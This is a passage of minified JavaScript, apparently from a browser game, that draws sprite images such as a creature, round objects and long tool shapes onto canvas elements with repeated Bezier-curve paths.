      a.bezierCurveTo(e * 233, e * 107, e * 212, e * 112, e * 202, e * 115);
      ye(a, undefined, t[2], e * 40);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 56, e * 50);
      a.bezierCurveTo(e * 56, e * 82, e * 73, e * 82, e * 93, e * 89);
      ye(a, undefined, t[2], e * 40);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 93, e * 55);
      a.bezierCurveTo(e * 127, e * 27, e * 195, e * 42, e * 213, e * 78);
      a.bezierCurveTo(e * 254, e * 134, e * 226, e * 198, e * 153, e * 197);
      a.bezierCurveTo(e * 59, e * 204, e * 56, e * 158, e * 51, e * 115);
      a.bezierCurveTo(e * 50, e * 93, e * 81, e * 62, e * 90, e * 57);
      a.closePath();
      ye(a, t[1], t[2], e * 10);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 100, e * 33);
      a.bezierCurveTo(e * 85, e * 62, e * 102, e * 66, e * 110, e * 83);
      ye(a, undefined, t[1], e * 20);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 181, e * 32);
      a.bezierCurveTo(e * 196, e * 62, e * 181, e * 68, e * 178, e * 69);
      ye(a, undefined, t[1], e * 20);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 225, e * 52);
      a.bezierCurveTo(e * 228, e * 78, e * 207, e * 77, e * 192, e * 88);
      ye(a, undefined, t[1], e * 20);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 34, e * 134);
      a.bezierCurveTo(e * 46, e * 111, e * 57, e * 111, e * 79, e * 109);
      ye(a, undefined, t[1], e * 20);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 249, e * 135);
      a.bezierCurveTo(e * 233, e * 107, e * 212, e * 112, e * 202, e * 115);
      ye(a, undefined, t[1], e * 20);
      a.beginPath();
      a.lineCap = "round";
      a.lineJoin = "round";
      a.moveTo(e * 56, e * 50);
      a.bezierCurveTo(e * 56, e * 82, e * 73, e * 82, e * 93, e * 89);
      ye(a, undefined, t[1], e * 20);
      ze(a, e * 101, e * 155, e * 20.591260281974);
      ye(a, t[3]);
      ze(a, e * 180, e * 155, e * 20.591260281974);
      ye(a, t[3]);
      ze(a, e * 95, e * 148, e * 7.211102550927978);
      ye(a, t[4]);
      ze(a, e * 173, e * 148, e * 7.211102550927978);
      ye(a, t[4]);
      if (r === 1) {
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 191, e * 107);
        a.bezierCurveTo(e * 180, e * 104, e * 175, e * 101, e * 180, e * 95);
        a.bezierCurveTo(e * 180, e * 95, e * 181, e * 99, e * 188, e * 103);
        a.bezierCurveTo(e * 191, e * 101, e * 191, e * 95, e * 190, e * 91);
        a.bezierCurveTo(e * 190, e * 91, e * 196, e * 89, e * 195, e * 99);
        a.closePath();
        ye(a, t[2]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 206, e * 98);
        a.bezierCurveTo(e * 203, e * 95, e * 200, e * 93, e * 198, e * 101);
        a.bezierCurveTo(e * 194, e * 109, e * 193, e * 109, e * 196, e * 110);
        a.bezierCurveTo(e * 206, e * 115, e * 209, e * 114, e * 211, e * 111);
        a.bezierCurveTo(e * 211, e * 106, e * 208, e * 108, e * 203, e * 108);
        a.bezierCurveTo(e * 193, e * 107, e * 204, e * 101, e * 206, e * 99);
        a.closePath();
        ye(a, t[2]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 172, e * 111);
        a.bezierCurveTo(e * 172, e * 106, e * 174, e * 105, e * 185, e * 109);
        a.bezierCurveTo(e * 190, e * 109, e * 189, e * 114, e * 185, e * 120);
        a.bezierCurveTo(e * 181, e * 125, e * 180, e * 126, e * 176, e * 122);
        a.bezierCurveTo(e * 182, e * 119, e * 187, e * 110, e * 182, e * 112);
        a.closePath();
        ye(a, t[2]);
        a.beginPath();
        a.lineCap = "round";
        a.lineJoin = "round";
        a.moveTo(e * 202, e * 125);
        a.bezierCurveTo(e * 197, e * 117, e * 193, e * 116, e * 193, e * 120);
        a.bezierCurveTo(e * 192.5, e * 124.5, e * 192.5, e * 124.5, e * 192, e * 129);
        a.bezierCurveTo(e * 188, e * 129, e * 187, e * 124, e * 189, e * 120);
        a.bezierCurveTo(e * 191, e * 110, e * 192, e * 110, e * 200, e * 116);
        a.bezierCurveTo(e * 208, e * 120, e * 207, e * 123, e * 202, e * 125);
        a.closePath();
        ye(a, t[2]);
      }
      return n;
    }
    function Vi(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 283;
      t.height = e * 224;
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 100, e * 33);
      r.bezierCurveTo(e * 85, e * 62, e * 102, e * 66, e * 110, e * 83);
      ye(r, undefined, i[0], e * 40);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 181, e * 32);
      r.bezierCurveTo(e * 196, e * 62, e * 181, e * 68, e * 178, e * 69);
      ye(r, undefined, i[0], e * 40);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 225, e * 52);
      r.bezierCurveTo(e * 228, e * 78, e * 207, e * 77, e * 192, e * 88);
      ye(r, undefined, i[0], e * 40);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 34, e * 134);
      r.bezierCurveTo(e * 46, e * 111, e * 57, e * 111, e * 79, e * 109);
      ye(r, undefined, i[0], e * 40);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 249, e * 135);
      r.bezierCurveTo(e * 233, e * 107, e * 212, e * 112, e * 202, e * 115);
      ye(r, undefined, i[0], e * 40);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 56, e * 50);
      r.bezierCurveTo(e * 56, e * 82, e * 73, e * 82, e * 93, e * 89);
      ye(r, undefined, i[0], e * 40);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 93, e * 55);
      r.bezierCurveTo(e * 124, e * 29, e * 179, e * 44, e * 188, e * 52);
      r.bezierCurveTo(e * 207, e * 64, e * 226, e * 94, e * 231, e * 118);
      r.bezierCurveTo(e * 236, e * 145, e * 222, e * 184, e * 193, e * 192);
      r.bezierCurveTo(e * 147, e * 201, e * 116, e * 200, e * 93, e * 193);
      r.bezierCurveTo(e * 61, e * 180, e * 48, e * 147, e * 50, e * 123);
      r.bezierCurveTo(e * 50, e * 93, e * 76, e * 66, e * 92, e * 56);
      r.closePath();
      ye(r, i[0]);
      return t;
    }
    function wi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 131;
      r.height = e * 121;
      n.translate(0, e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 110, e * 59);
      n.bezierCurveTo(e * 93, e * 61.5, e * 93, e * 61.5, e * 76, e * 64);
      n.bezierCurveTo(e * 84.5, e * 78.5, e * 84.5, e * 78.5, e * 93, e * 93);
      n.bezierCurveTo(e * 70, e * 111, e * 43, e * 103, e * 30, e * 82);
      n.bezierCurveTo(e * 17, e * 61, e * 25, e * 30, e * 51, e * 21);
      n.bezierCurveTo(e * 66, e * 15, e * 83, e * 18, e * 96, e * 29);
      n.bezierCurveTo(e * 104, e * 35, e * 109, e * 47, e * 110, e * 58);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 110, e * 59);
      n.bezierCurveTo(e * 93, e * 61.5, e * 93, e * 61.5, e * 76, e * 64);
      n.bezierCurveTo(e * 84.5, e * 78.5, e * 84.5, e * 78.5, e * 93, e * 93);
      n.bezierCurveTo(e * 70, e * 111, e * 43, e * 103, e * 30, e * 82);
      n.bezierCurveTo(e * 17, e * 61, e * 25, e * 30, e * 51, e * 21);
      n.bezierCurveTo(e * 66, e * 15, e * 83, e * 18, e * 96, e * 29);
      n.bezierCurveTo(e * 104, e * 35, e * 109, e * 47, e * 110, e * 58);
      n.closePath();
      ye(n, t[1], t[2], e * 10);
      return r;
    }
    function Ki(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 104;
      r.height = e * 112;
      n.translate(0, e * 15);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 16, e * 44);
      n.bezierCurveTo(e * 30.5, e * 48, e * 30.5, e * 48, e * 45, e * 52);
      n.bezierCurveTo(e * 36.5, e * 63, e * 36.5, e * 63, e * 28, e * 74);
      n.bezierCurveTo(e * 32, e * 86, e * 61, e * 92, e * 78, e * 76);
      n.bezierCurveTo(e * 93, e * 62, e * 92, e * 40, e * 80, e * 26);
      n.bezierCurveTo(e * 65, e * 11, e * 42, e * 16, e * 34, e * 21);
      n.bezierCurveTo(e * 22, e * 27, e * 16, e * 39, e * 16, e * 44);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(0, e * -15);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 16, e * 44);
      n.bezierCurveTo(e * 30.5, e * 48, e * 30.5, e * 48, e * 45, e * 52);
      n.bezierCurveTo(e * 36.5, e * 63, e * 36.5, e * 63, e * 28, e * 74);
      n.bezierCurveTo(e * 32, e * 86, e * 61, e * 92, e * 78, e * 76);
      n.bezierCurveTo(e * 93, e * 62, e * 92, e * 40, e * 80, e * 26);
      n.bezierCurveTo(e * 65, e * 11, e * 42, e * 16, e * 34, e * 21);
      n.bezierCurveTo(e * 22, e * 27, e * 16, e * 39, e * 16, e * 44);
      n.closePath();
      ye(n, t[1], t[2], e * 8);
      return r;
    }
    function Ui(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 321;
      r.height = e * 284;
      n.translate(e * 100, e * 30);
      n.translate(e * 5, e * 10);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 58, e * 33);
      n.bezierCurveTo(e * 81, e * 22, e * 93, e * 26, e * 123, e * 47);
      n.bezierCurveTo(e * 160, e * 73, e * 169, e * 80, e * 191, e * 99);
      n.bezierCurveTo(e * 202, e * 107, e * 211, e * 118, e * 195, e * 151);
      n.bezierCurveTo(e * 181, e * 183, e * 157, e * 192, e * 129, e * 174);
      n.bezierCurveTo(e * 78, e * 140, e * 68, e * 129, e * 37, e * 94);
      n.bezierCurveTo(e * 15, e * 68, e * 25, e * 52, e * 56, e * 34);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 58, e * 33);
      n.bezierCurveTo(e * 81, e * 22, e * 93, e * 26, e * 123, e * 47);
      n.bezierCurveTo(e * 160, e * 73, e * 169, e * 80, e * 191, e * 99);
      n.bezierCurveTo(e * 202, e * 107, e * 211, e * 118, e * 195, e * 151);
      n.bezierCurveTo(e * 181, e * 183, e * 157, e * 192, e * 129, e * 174);
      n.bezierCurveTo(e * 78, e * 140, e * 68, e * 129, e * 37, e * 94);
      n.bezierCurveTo(e * 15, e * 68, e * 25, e * 52, e * 56, e * 34);
      n.closePath();
      ye(n, t[1], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 167, e * 120);
      n.bezierCurveTo(e * 196, e * 106, e * 207, e * 111, e * 199, e * 135);
      n.bezierCurveTo(e * 185, e * 172, e * 166, e * 187, e * 145, e * 179);
      n.bezierCurveTo(e * 118, e * 166, e * 127, e * 139, e * 166, e * 121);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 25, e * 64);
      n.bezierCurveTo(e * 59, e * 96, e * 97, e * 128, e * 129, e * 151);
      n.bezierCurveTo(e * 126, e * 163, e * 134, e * 174, e * 142, e * 180);
      n.bezierCurveTo(e * 114, e * 170, e * 68, e * 134, e * 31, e * 85);
      n.bezierCurveTo(e * 24, e * 71, e * 24, e * 70, e * 25, e * 65);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 161, e * 141);
      n.bezierCurveTo(e * 181, e * 131, e * 186, e * 135, e * 173, e * 152);
      n.bezierCurveTo(e * 163, e * 163, e * 155, e * 161, e * 151, e * 150);
      n.bezierCurveTo(e * 147, e * 140, e * 155, e * 131, e * 175, e * 125);
      n.bezierCurveTo(e * 190, e * 120, e * 196, e * 121, e * 189, e * 143);
      n.bezierCurveTo(e * 182, e * 167, e * 169, e * 174, e * 157, e * 174);
      n.bezierCurveTo(e * 138, e * 172, e * 139, e * 162, e * 140, e * 156);
      ye(n, undefined, t[4], e * 4);
      n.translate(e * -100, e * -30);
      n.translate(e * 10, e * 70);
      n.translate(e * 5, e * 10);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 58, e * 33);
      n.bezierCurveTo(e * 81, e * 22, e * 93, e * 26, e * 123, e * 47);
      n.bezierCurveTo(e * 160, e * 73, e * 169, e * 80, e * 191, e * 99);
      n.bezierCurveTo(e * 202, e * 107, e * 211, e * 118, e * 195, e * 151);
      n.bezierCurveTo(e * 181, e * 183, e * 157, e * 192, e * 129, e * 174);
      n.bezierCurveTo(e * 78, e * 140, e * 68, e * 129, e * 37, e * 94);
      n.bezierCurveTo(e * 15, e * 68, e * 25, e * 52, e * 56, e * 34);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 58, e * 33);
      n.bezierCurveTo(e * 81, e * 22, e * 93, e * 26, e * 123, e * 47);
      n.bezierCurveTo(e * 160, e * 73, e * 169, e * 80, e * 191, e * 99);
      n.bezierCurveTo(e * 202, e * 107, e * 211, e * 118, e * 195, e * 151);
      n.bezierCurveTo(e * 181, e * 183, e * 157, e * 192, e * 129, e * 174);
      n.bezierCurveTo(e * 78, e * 140, e * 68, e * 129, e * 37, e * 94);
      n.bezierCurveTo(e * 15, e * 68, e * 25, e * 52, e * 56, e * 34);
      n.closePath();
      ye(n, t[1], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 167, e * 120);
      n.bezierCurveTo(e * 196, e * 106, e * 207, e * 111, e * 199, e * 135);
      n.bezierCurveTo(e * 185, e * 172, e * 166, e * 187, e * 145, e * 179);
      n.bezierCurveTo(e * 118, e * 166, e * 127, e * 139, e * 166, e * 121);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 25, e * 64);
      n.bezierCurveTo(e * 59, e * 96, e * 97, e * 128, e * 129, e * 151);
      n.bezierCurveTo(e * 126, e * 163, e * 134, e * 174, e * 142, e * 180);
      n.bezierCurveTo(e * 114, e * 170, e * 68, e * 134, e * 31, e * 85);
      n.bezierCurveTo(e * 24, e * 71, e * 24, e * 70, e * 25, e * 65);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 161, e * 141);
      n.bezierCurveTo(e * 181, e * 131, e * 186, e * 135, e * 173, e * 152);
      n.bezierCurveTo(e * 163, e * 163, e * 155, e * 161, e * 151, e * 150);
      n.bezierCurveTo(e * 147, e * 140, e * 155, e * 131, e * 175, e * 125);
      n.bezierCurveTo(e * 190, e * 120, e * 196, e * 121, e * 189, e * 143);
      n.bezierCurveTo(e * 182, e * 167, e * 169, e * 174, e * 157, e * 174);
      n.bezierCurveTo(e * 138, e * 172, e * 139, e * 162, e * 140, e * 156);
      ye(n, undefined, t[4], e * 4);
      n.translate(e * 20, e * -80);
      n.translate(e * 5, e * 10);
      n.globalAlpha = i ? 0.5 : 1;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 58, e * 33);
      n.bezierCurveTo(e * 81, e * 22, e * 93, e * 26, e * 123, e * 47);
      n.bezierCurveTo(e * 160, e * 73, e * 169, e * 80, e * 191, e * 99);
      n.bezierCurveTo(e * 202, e * 107, e * 211, e * 118, e * 195, e * 151);
      n.bezierCurveTo(e * 181, e * 183, e * 157, e * 192, e * 129, e * 174);
      n.bezierCurveTo(e * 78, e * 140, e * 68, e * 129, e * 37, e * 94);
      n.bezierCurveTo(e * 15, e * 68, e * 25, e * 52, e * 56, e * 34);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -5, e * -10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 58, e * 33);
      n.bezierCurveTo(e * 81, e * 22, e * 93, e * 26, e * 123, e * 47);
      n.bezierCurveTo(e * 160, e * 73, e * 169, e * 80, e * 191, e * 99);
      n.bezierCurveTo(e * 202, e * 107, e * 211, e * 118, e * 195, e * 151);
      n.bezierCurveTo(e * 181, e * 183, e * 157, e * 192, e * 129, e * 174);
      n.bezierCurveTo(e * 78, e * 140, e * 68, e * 129, e * 37, e * 94);
      n.bezierCurveTo(e * 15, e * 68, e * 25, e * 52, e * 56, e * 34);
      n.closePath();
      ye(n, t[1], t[2], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 167, e * 120);
      n.bezierCurveTo(e * 196, e * 106, e * 207, e * 111, e * 199, e * 135);
      n.bezierCurveTo(e * 185, e * 172, e * 166, e * 187, e * 145, e * 179);
      n.bezierCurveTo(e * 118, e * 166, e * 127, e * 139, e * 166, e * 121);
      n.closePath();
      ye(n, t[3]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 25, e * 64);
      n.bezierCurveTo(e * 59, e * 96, e * 97, e * 128, e * 129, e * 151);
      n.bezierCurveTo(e * 126, e * 163, e * 134, e * 174, e * 142, e * 180);
      n.bezierCurveTo(e * 114, e * 170, e * 68, e * 134, e * 31, e * 85);
      n.bezierCurveTo(e * 24, e * 71, e * 24, e * 70, e * 25, e * 65);
      n.closePath();
      ye(n, t[2]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 161, e * 141);
      n.bezierCurveTo(e * 181, e * 131, e * 186, e * 135, e * 173, e * 152);
      n.bezierCurveTo(e * 163, e * 163, e * 155, e * 161, e * 151, e * 150);
      n.bezierCurveTo(e * 147, e * 140, e * 155, e * 131, e * 175, e * 125);
      n.bezierCurveTo(e * 190, e * 120, e * 196, e * 121, e * 189, e * 143);
      n.bezierCurveTo(e * 182, e * 167, e * 169, e * 174, e * 157, e * 174);
      n.bezierCurveTo(e * 138, e * 172, e * 139, e * 162, e * 140, e * 156);
      ye(n, undefined, t[4], e * 4);
      return r;
    }
    function Yi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 290;
      r.height = e * 525;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 20, e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 111, e * 351);
      n.bezierCurveTo(e * 128.5, e * 218.5, e * 128.5, e * 218.5, e * 146, e * 86);
      n.bezierCurveTo(e * 166.5, e * 66.5, e * 166.5, e * 66.5, e * 187, e * 47);
      n.bezierCurveTo(e * 201, e * 71.5, e * 201, e * 71.5, e * 215, e * 96);
      n.bezierCurveTo(e * 193, e * 228.5, e * 193, e * 228.5, e * 171, e * 361);
      n.closePath();
      ye(n, t[0]);
      n.save();
      n.translate(e * 129.5, e * 424);
      n.rotate(0.16);
      Be(n, e * -15.5, e * -63, e * 31, e * 126, e * 10);
      n.restore();
      ye(n, t[0]);
      ze(n, e * 121, e * 480, e * 20.396078054371138);
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 90, e * 311);
      n.bezierCurveTo(e * 95, e * 324, e * 95, e * 324, e * 100, e * 337);
      n.bezierCurveTo(e * 141.5, e * 345.5, e * 141.5, e * 345.5, e * 183, e * 354);
      n.bezierCurveTo(e * 193.5, e * 342.5, e * 193.5, e * 342.5, e * 204, e * 331);
      n.bezierCurveTo(e * 202, e * 354, e * 202, e * 354, e * 200, e * 377);
      n.bezierCurveTo(e * 147, e * 388, e * 106, e * 371, e * 79, e * 356);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -20, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 111, e * 351);
      n.bezierCurveTo(e * 128.5, e * 218.5, e * 128.5, e * 218.5, e * 146, e * 86);
      n.bezierCurveTo(e * 166.5, e * 66.5, e * 166.5, e * 66.5, e * 187, e * 47);
      n.bezierCurveTo(e * 201, e * 71.5, e * 201, e * 71.5, e * 215, e * 96);
      n.bezierCurveTo(e * 193, e * 228.5, e * 193, e * 228.5, e * 171, e * 361);
      n.closePath();
      ye(n, t[1], t[2], e * 12.5);
      n.save();
      n.translate(e * 129.5, e * 424);
      n.rotate(0.16);
      Be(n, e * -15.5, e * -63, e * 31, e * 126, e * 10);
      n.restore();
      ye(n, t[4], t[5], e * 12.5);
      ze(n, e * 121, e * 480, e * 20.396078054371138);
      ye(n, t[4], t[5], e * 12.5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 90, e * 311);
      n.bezierCurveTo(e * 95, e * 324, e * 95, e * 324, e * 100, e * 337);
      n.bezierCurveTo(e * 141.5, e * 345.5, e * 141.5, e * 345.5, e * 183, e * 354);
      n.bezierCurveTo(e * 193.5, e * 342.5, e * 193.5, e * 342.5, e * 204, e * 331);
      n.bezierCurveTo(e * 202, e * 354, e * 202, e * 354, e * 200, e * 377);
      n.bezierCurveTo(e * 147, e * 388, e * 106, e * 371, e * 79, e * 356);
      n.closePath();
      ye(n, t[1], t[2], e * 12.5);
      return r;
    }
    function ki(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 290;
      r.height = e * 525;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 20, e * 20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 112, e * 356);
      n.bezierCurveTo(e * 124, e * 220.5, e * 124, e * 220.5, e * 136, e * 85);
      n.bezierCurveTo(e * 162.5, e * 65.5, e * 162.5, e * 65.5, e * 189, e * 46);
      n.bezierCurveTo(e * 208.5, e * 72.5, e * 208.5, e * 72.5, e * 228, e * 99);
      n.bezierCurveTo(e * 200, e * 232, e * 200, e * 232, e * 172, e * 365);
      n.closePath();
      ye(n, t[0]);
      n.save();
      n.translate(e * 131, e * 423);
      n.rotate(0.16);
      Be(n, e * -14, e * -53, e * 28, e * 106, e * 10);
      n.restore();
      ye(n, t[0]);
      n.save();
      n.translate(e * 122, e * 480);
      n.rotate(1.72);
      Ve(n, 4, e * 26.476404589747453, e * 10);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 210, e * 387);
      n.bezierCurveTo(e * 138, e * 376, e * 138, e * 376, e * 66, e * 365);
      n.bezierCurveTo(e * 76, e * 355, e * 76, e * 355, e * 86, e * 345);
      n.bezierCurveTo(e * 99, e * 346.5, e * 99, e * 346.5, e * 112, e * 348);
      n.bezierCurveTo(e * 128.5, e * 344, e * 128.5, e * 344, e * 145, e * 340);
      n.bezierCurveTo(e * 158, e * 348, e * 158, e * 348, e * 171, e * 356);
      n.bezierCurveTo(e * 184, e * 358, e * 184, e * 358, e * 197, e * 360);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 129, e * 338);
      n.bezierCurveTo(e * 137, e * 336, e * 137, e * 336, e * 145, e * 334);
      n.bezierCurveTo(e * 152.5, e * 338, e * 152.5, e * 338, e * 160, e * 342);
      n.bezierCurveTo(e * 184, e * 224, e * 184, e * 224, e * 208, e * 106);
      n.bezierCurveTo(e * 197, e * 88, e * 187, e * 70, e * 186, e * 70);
      n.bezierCurveTo(e * 169.5, e * 83, e * 169.5, e * 83, e * 153, e * 96);
      n.closePath();
      ye(n, t[0]);
      n.globalAlpha = 1;
      n.translate(e * -20, e * -20);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 112, e * 356);
      n.bezierCurveTo(e * 124, e * 220.5, e * 124, e * 220.5, e * 136, e * 85);
      n.bezierCurveTo(e * 162.5, e * 65.5, e * 162.5, e * 65.5, e * 189, e * 46);
      n.bezierCurveTo(e * 208.5, e * 72.5, e * 208.5, e * 72.5, e * 228, e * 99);
      n.bezierCurveTo(e * 200, e * 232, e * 200, e * 232, e * 172, e * 365);
      n.closePath();
      ye(n, t[1], t[2], e * 12.5);
      n.save();
      n.translate(e * 131, e * 423);
      n.rotate(0.16);
      Be(n, e * -14, e * -53, e * 28, e * 106, e * 10);
      n.restore();
      ye(n, t[4], t[5], e * 12.5);
      n.save();
      n.translate(e * 122, e * 480);
      n.rotate(1.72);
      Ve(n, 4, e * 26.476404589747453, e * 10);
      n.restore();
      ye(n, t[1], t[2], e * 12.5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 210, e * 387);
      n.bezierCurveTo(e * 138, e * 376, e * 138, e * 376, e * 66, e * 365);
      n.bezierCurveTo(e * 76, e * 355, e * 76, e * 355, e * 86, e * 345);
      n.bezierCurveTo(e * 99, e * 346.5, e * 99, e * 346.5, e * 112, e * 348);
      n.bezierCurveTo(e * 128.5, e * 344, e * 128.5, e * 344, e * 145, e * 340);
      n.bezierCurveTo(e * 158, e * 348, e * 158, e * 348, e * 171, e * 356);
      n.bezierCurveTo(e * 184, e * 358, e * 184, e * 358, e * 197, e * 360);
      n.closePath();
      ye(n, t[1], t[2], e * 12.5);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 129, e * 338);
      n.bezierCurveTo(e * 137, e * 336, e * 137, e * 336, e * 145, e * 334);
      n.bezierCurveTo(e * 152.5, e * 338, e * 152.5, e * 338, e * 160, e * 342);
      n.bezierCurveTo(e * 184, e * 224, e * 184, e * 224, e * 208, e * 106);
      n.bezierCurveTo(e * 197, e * 88, e * 187, e * 70, e * 186, e * 70);
      n.bezierCurveTo(e * 169.5, e * 83, e * 169.5, e * 83, e * 153, e * 96);
      n.closePath();
      ye(n, t[3]);
      return r;
    }
    function Fi(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 290;
      r.height = e * 525;
      n.globalAlpha = i ? 0.5 : 1;
      n.translate(e * 20, e * 20);
      n.translate(e * -20, e * -20);
      n.save();
      n.translate(e * 132, e * 423);
      n.rotate(0.16);
      Be(n, e * -14, e * -61, e * 28, e * 122, e * 10);
      n.restore();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 100, e * 344);
      n.bezierCurveTo(e * 123, e * 214, e * 123, e * 214, e * 146, e * 84);
      n.bezierCurveTo(e * 166.5, e * 65, e * 166.5, e * 65, e * 187, e * 46);
      n.bezierCurveTo(e * 201, e * 71, e * 201, e * 71, e * 215, e * 96);
      n.bezierCurveTo(e * 199.5, e * 226.5, e * 199.5, e * 226.5, e * 184, e * 357);
      n.bezierCurveTo(e * 162.5, e * 362.5, e * 162.5, e * 362.5, e * 141, e * 368);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 75, e * 328);
      n.bezierCurveTo(e * 88, e * 336.5, e * 88, e * 336.5, e * 101, e * 345);
      n.bezierCurveTo(e * 123.5, e * 337.5, e * 123.5, e * 337.5, e * 146, e * 330);
      n.bezierCurveTo(e * 165, e * 343.5, e * 165, e * 343.5, e * 184, e * 357);
      n.bezierCurveTo(e * 198.5, e * 353, e * 198.5, e * 353, e * 213, e * 349);
      n.bezierCurveTo(e * 200.5, e * 364.5, e * 200.5, e * 364.5, e * 188, e * 380);
      n.bezierCurveTo(e * 163, e * 380.5, e * 163, e * 380.5, e * 138, e * 381);
      n.bezierCurveTo(e * 112, e * 373.5, e * 112, e * 373.5, e * 86, e * 366);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 121, e * 332);
      n.bezierCurveTo(e * 133.5, e * 327.5, e * 133.5, e * 327.5, e * 146, e * 323);
      n.bezierCurveTo(e * 157, e * 330.5, e * 157, e * 330.5, e * 168, e * 338);
      n.bezierCurveTo(e * 182.5, e * 219.5, e * 182.5, e * 219.5, e * 197, e * 101);
      n.bezierCurveTo(e * 190, e * 84.5, e * 190, e * 84.5, e * 183, e * 68);
      n.bezierCurveTo(e * 172.5, e * 81, e * 172.5, e * 81, e * 162, e * 94);
      n.closePath();
      ye(n, t[0]);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 105, e * 463);
